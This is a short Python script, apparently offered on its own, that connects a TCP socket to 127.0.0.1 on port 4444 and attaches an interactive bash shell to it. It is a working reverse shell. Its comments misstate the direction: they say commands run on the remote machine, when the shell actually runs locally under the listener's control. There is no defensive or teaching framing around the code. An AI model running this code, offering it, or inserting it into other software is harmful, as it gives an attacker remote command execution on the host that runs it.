import socket
import subprocess

# The IP address and port of the remote machine
remote_ip = '127.0.0.1'
remote_port = 4444

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the remote machine
sock.connect((remote_ip, remote_port))

# Create a subprocess to execute commands on the remote machine
proc = subprocess.Popen(['/bin/bash', '-i'], stdin=sock, stdout=sock, stderr=sock)

# Keep the connection open until the subprocess is finished
proc.wait()

# Close the socket
sock.close()
